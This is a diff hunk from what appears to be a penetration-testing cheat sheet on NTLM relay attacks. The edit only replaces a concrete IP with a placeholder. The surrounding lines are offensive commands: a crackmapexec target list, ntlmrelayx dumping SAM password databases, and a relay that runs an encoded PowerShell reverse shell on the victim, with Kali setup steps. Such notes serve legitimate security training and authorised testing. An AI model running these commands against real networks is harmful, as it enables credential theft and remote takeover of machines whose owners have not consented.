@@ -87,7 +87,7 @@ DISABLE SMB and HTTP in: /usr/share/responder/Responder.conf
 cme smb <CIDR> --gen-relay-list targets.txt
 ntlmrelayx.py -tf targets.txt (dumps successfully authenticated system's SAM database)
 //relay to get reverse shell
-sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc ###ENCODE###
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t relay_target_ip -c 'powershell -enc ###ENCODE###
 -> Get ENCODE From here: run.txt-> raw reverse shell
 	kali@kali:~$ sudo apt -y install powershell
 	kali@kali:~$ pwsh
